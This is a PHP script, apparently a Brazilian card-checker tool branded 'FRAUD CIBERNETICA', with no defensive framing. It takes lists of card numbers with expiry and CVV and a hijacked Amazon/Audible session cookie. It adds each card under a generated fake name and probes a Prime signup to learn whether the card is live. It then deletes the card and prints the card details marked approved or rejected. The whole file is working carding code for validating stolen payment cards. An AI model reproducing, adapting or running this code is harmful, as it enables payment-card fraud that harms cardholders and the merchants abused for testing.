<?php
ignore_user_abort();
error_reporting(0);
session_start();
$time = time();

ini_set('memory_limit', '-1');

function trazer($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function multiexplode($string) {
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function gerarCPF() {
    for ($i = 0; $i < 9; $i++) {
        $cpf[$i] = mt_rand(0, 9);
    }

    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
        $soma += ($cpf[$i] * (10 - $i));
    }
    $resto = $soma % 11;
    $cpf[9] = ($resto < 2) ? 0 : (11 - $resto);

    $soma = 0;
    for ($i = 0; $i < 10; $i++) {
        $soma += ($cpf[$i] * (11 - $i));
    }
    $resto = $soma % 11;
    $cpf[10] = ($resto < 2) ? 0 : (11 - $resto);

    return implode('', $cpf);
}

function generate_email() {
    $domains = array("gmail.com", "hotmail.com", "yahoo.com", "outlook.com");
    $domain = $domains[array_rand($domains)];
    $timestamp = time();
    $random_num = mt_rand(1, 10000);
    $email = "user_" . $timestamp . "_" . $random_num . "@$domain";
    return $email;
}

// Verifica se o método da requisição é POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtém os dados do corpo da requisição
    parse_str(file_get_contents('php://input'), $_POST);

    $lista = str_replace(" ", "", $_POST['lista']);
    $separar = explode("|", $lista);
    $cc = $separar[0];
    $mes = $separar[1];
    $ano = $separar[2];
    $cvv = $separar[3];
    $lista = ("$cc|$mes|$ano|$cvv");

    $parte1 = substr($cc, 0, 4);
    $parte2 = substr($cc, 4, 4);
    $parte3 = substr($cc, 8, 4);
    $parte4 = substr($cc, 12, 4);

    $json_str = file_get_contents('bins.json');
    $bins = json_decode($json_str, true);
    $bin = substr($cc, 0, 6);
    if (isset($bins[$bin])) {
        $a = json_encode($bins[$bin]);

        $bandeira = trazer($a, 'bandeira":"', '"');
        $nivel = trazer($a, 'level":"', '"');
        $bank = trazer($a, 'banco":"', '"');
        $pais = trazer($a, 'pais":"', '"');
        $puxad = " $bandeira$nivel $bank $pais";
    } else {
        function bin($cc) {
            $contents = file_get_contents("bins.csv");
            $pattern = preg_quote(substr($cc, 0, 6), '/');
            $pattern = "/^.*$pattern.*\$/m";
            if (preg_match_all($pattern, $contents, $matches)) {
                $encontrada = implode("\n", $matches[0]);
            }
            $pieces = explode(";", $encontrada);
            return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
        }
        $bin = bin($lista);
    }

    function generateRandomString($length = 12) {
        $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    #################################################
    // by: bruxo

    $info_bin = bin($lista);
    $cookie1 = $_POST['cookie1'];
    $cookie = trim($cookie1);
} else {
    echo "Método não permitido";
}

$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookies.txt");
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookies.txt");
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.4devs.com.br',
    'Accept: */*',
    'Sec-Fetch-Dest: empty',
    'Content-Type: application/x-www-form-urlencoded',
    'origin: https://www.4devs.com.br',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'referer: https://www.4devs.com.br/gerador_de_pessoas'));
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
  $end = curl_exec($ch);  

unlink($cookies);
$bruxo_dev77 = trazer($end, '"nome":"','"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo");
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    "Host: www.amazon.com",
    "Cookie: $cookie",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
));
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);

$customerId = trazer($resp, '"customerID":"', '"');
$session_id = trazer($resp, '"sessionId":"', '"');
$token_delete = trazer($resp, '"serializedState":"', '"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.com/account/payments?ref=a_account_o_l2_nav_2");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Cookie: $cookie",
));
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$add_card = curl_exec($curl);
$tok = trazer($add_card, 'name="csrfToken" value="', '"');
$tokenbruxo = urlencode($tok);

if ($tok === null) {
 
$tok = trazer($add_card, 'data-csrf-token="','"');
$tokenbruxo = urlencode($tok);

}

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.com/unified-payment/update-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com$enco&relativeUrl=%2Fsubscription%2Fconfirmation&");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Cookie: $cookie",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, "isMosaicMigrationRevampedEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isMfaForAddCardComplete=false&isVerifyCvv=false&isDialog=false&selectPaymentOnSuccess=false&ref=a_mAccontPamnts_c3_edit&paymentType=CreditCard&addCreditCardNumber=$parte1%20$parte2%20$parte3%20$parte4&expirationMonth=$mes&expirationYear=$ano&fullName=$bruxo_dev77&csrfToken=$tokenbruxo&country=US&addressLine1=230%20Vesey%20St%20Suite%20203C&addressLine2=&zipCode=10281&state=NY&city=NEW%20YORK&useAsDefault=true&addressId=&accountHolderName=$bruxo_dev77");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$add_card = curl_exec($curl);
$card_id = trazer($gerar_cardID, '"paymentId": "', '"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.com/gp/prime/pipeline/membersignup");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Host: www.amazon.com",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$post_verify = curl_exec($curl);

$token_verify = trazer($post_verify, 'name="ppw-widgetState" value="','"');
$offerToken = trazer($post_verify, 'name="offerToken" value="','"');


$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.com/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Host: www.amazon.com",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded; charset=UTF-8",
   "accept: application/json, text/javascript, */*; q=0.01",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, "ppw-jsEnabled=true&ppw-widgetState=$token_verify&ppw-widgetEvent=SavePaymentPreferenceEvent");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$post_verify2 = curl_exec($curl);

$card_id2 = trazer($post_verify2, '"preferencePaymentMethodIds":"[\"','\"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.com/hp/wlp/pipeline/actions");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_HEADER, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Host: www.amazon.com",
   "Cookie: $cookie",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded",
   "accept: */*",
));
curl_setopt($curl, CURLOPT_POSTFIELDS,"offerToken=$offertoken&session-id=$session_id&locationID=prime_confirm&primeCampaignId=SlashPrime&redirectURL=L2dwL3ByaW1l&cancelRedirectURL=Lw&location=prime_confirm&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&paymentMethodId=$card_id2&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&wlpLocation=prime_confirm&paymentMethodIdList=$card_id2");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$bruxo = curl_exec($curl);


$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.com/account/payments?ref=a_account_o_l2_nav_2&");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
"Cookie: $cookie",
));
$resp = curl_exec($curl);

$a = trazer($resp, 'data-billing-address-id="', '"');
$b = trazer($resp, 'data-payment-id="', '"');
$c = trazer($resp, 'data-payment-id="', 'payment-type');
$c = trazer($c, 'data-csrf-token="', '"');
$d = trazer($resp, 'href="/account/payments', '">');
$cd = trazer($resp, 'data-tail="', '"');
$bruxoenc = urlencode($d);

$tipbruxo = trazer($resp, 'data-display-issuer-name="', '"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.com/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.audible.com%2Faccount%2Fpayments$d&relativeUrl=%2Faccount%2Fpayments&");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"Accept-Encoding: gzip, deflate, br",
"Accept-Language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Cookie: $cookie",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, 'isMosaicMigrationRevampedEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isMfaForAddCardComplete=false&isVerifyCvv=false&isDialog=false&selectPaymentOnSuccess=false&ref=a_mAccontPamnts_c3_0_delete&paymentId='.$b.'&billingAddressId='.$a.'&paymentType=CreditCard&tail=8166&accountHolderName=STONE%20SOUZA%20PINTAO&isValid=true&isDefault=true&issuerName=Discover&displayIssuerName=Discover&bankName=&csrfToken='.$c.'&index=0&consentState=OptedIn');
 $resp   = curl_exec($curl);

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.audible.com/payments/optimus/delete?requestUrl=https%3A%2F%2Fwww.audible.com%2Faccount%2Fpayments$d&relativeUrl=%2Faccount%2Fpayments&");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"Accept-Encoding: gzip, deflate, br",
"Accept-Language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "Cookie: $cookie",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, 'isMosaicMigrationRevampedEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isMfaForAddCardComplete=false&isVerifyCvv=false&isDialog=false&selectPaymentOnSuccess=false&ref=a_mAccontPamnts_c3_0_delete&paymentId'.$b.'&billingAddressId='.$a.'&paymentType=CreditCard&tail=8166&accountHolderName=&isValid=true&isDefault=true&issuerName=Discover&displayIssuerName=Discover&bankName=&csrfToken='.$c.'&index=0&consentState=OptedIn&statusStringKey=adbl_paymentswidget_delete_payment_success&statusSuccess=true&csrfTokenValid=true');
 $resp   = curl_exec($curl);

if (strpos($resp, 'Card successfully deleted.')) {
        $msg  = '✅';
        $err  = "REMOVIDO: $msg $err1";
    } else {
        $msg = '❌';
        $err = "REMOVIDO: $msg $err1";
    }

 if (strpos($bruxo, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) {

    echo "<font style=color:#00ff88><span class='badge badge-soft-success'>Aprovadas </span> ➔ $cc|$mes|$ano|$cvv</font>➜REMOVIDO:$msg<font style=color:#00ff88>$nome</font> ➜ <font style=color:#00ff88>$bin ➔ Retorno: <span class='badge badge-soft-success'>[ℂ𝔸ℝ𝕋𝔸𝕆 𝔸ℙℝ𝕆𝕍𝔸𝔻𝕆]</span><b>Tempo de Resposta: (" . (time() - $time) . " SEG) ➔ 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 {  ♛ 𝔽ℝ𝔸𝕌𝔻 ℂ𝕀𝔹𝔼ℝℕ𝔼𝕋𝕀ℂ𝔸 ♛ }</b></font><br>";
}  elseif (strpos($bruxo, 'Desculpe. Não foi possível concluir sua inscrição do Prime no momento. Se você ainda quiser participar do Prime, é possível se inscrever durante a finalização da compra.')) {

        echo "<font style=color:#00ff88><span class='badge badge-soft-success'>Aprovadas </span> ➔ $cc|$mes|$ano|$cvv</font>➜REMOVIDO:$msg<font style=color:#00ff88>$nome</font> ➜ <font style=color:#00ff88>$bin ➔ Retorno: <span class='badge badge-soft-success'>[ℂ𝔸ℝ𝕋𝔸𝕆 𝔸ℙℝ𝕆𝕍𝔸𝔻𝕆]</span><b>Tempo de Resposta: (" . (time() - $time) . " SEG) ➔ 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 {  ♛ 𝔽ℝ𝔸𝕌𝔻 ℂ𝕀𝔹𝔼ℝℕ𝔼𝕋𝕀ℂ𝔸 ♛ }</b></font><br>";
        
    }elseif (strpos($bruxo, 'InvalidInput')) {
    
    echo "<font style=color:#f6ff00><span class='badge badge-soft-danger'>Reprovadas </span> ➔ $cc|$mes|$ano|$cvv</font>➜REMOVIDO:$msg<font style=color:#f6ff00>$nome</font> ➜ <font style=color:#f6ff00>$bin ➔ Retorno: <span class='badge badge-soft-danger'>[ℂ𝔸ℝ𝔻 𝕀ℕ𝕍𝔸𝕃𝕀𝔻𝕆] </span><b>Tempo de Resposta: (" . (time() - $time) . " SEG) ➔ 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 {  ♛ 𝔽ℝ𝔸𝕌𝔻 ℂ𝕀𝔹𝔼ℝℕ𝔼𝕋𝕀ℂ𝔸 ♛ }</b></font><br>";
    curl_close($curl);
    exit();

} elseif (strpos($bruxo, 'HARDVET_VERIFICATION_FAILED')) {

    echo "<font style=color:#f6ff00><span class='badge badge-soft-danger'>Reprovadas </span> ➔ $cc|$mes|$ano|$cvv</font>➜REMOVIDO:$msg<font style=color:#0789f2>$nome</font> ➜ <font style=color:#f6ff00>$bin ➔ Retorno: <span class='badge badge-soft-warning'>[ℙ𝔸𝔾𝔸𝕄𝔼ℕ𝕋𝕆 ℝ𝔼ℂ𝕌𝕊𝔸𝔻𝕆]</span><b>Tempo de Resposta: (" . (time() - $time) . " SEG) ➔ 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 {  ♛ 𝔽ℝ𝔸𝕌𝔻 ℂ𝕀𝔹𝔼ℝℕ𝔼𝕋𝕀ℂ𝔸 ♛ }</b></font><br>";
    curl_close($curl);
    exit();
} else {
    echo "<font style=color:#ff0000 0><span class='badge badge-soft-danger'>Reprovadas </span> ➔ $cc|$mes|$ano|$cvv</font>➜REMOVIDO:$msg<font style=color:#ff0000>$nome</font> ➜ <font style=color:#ff0000>$bin ➔ Retorno: <span class='badge badge-soft-warning'>[ℂ𝕆𝕆𝕂𝕀𝔼 ℂ𝔸𝕀𝕌]</span><b>Tempo de Resposta: (" . (time() - $time) . " SEG) ➔ 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 {  ♛ 𝔽ℝ𝔸𝕌𝔻 ℂ𝕀𝔹𝔼ℝℕ𝔼𝕋𝕀ℂ𝔸 ♛ }</b></font><br>";
    curl_close($curl);
    exit();

        

             #   }
                }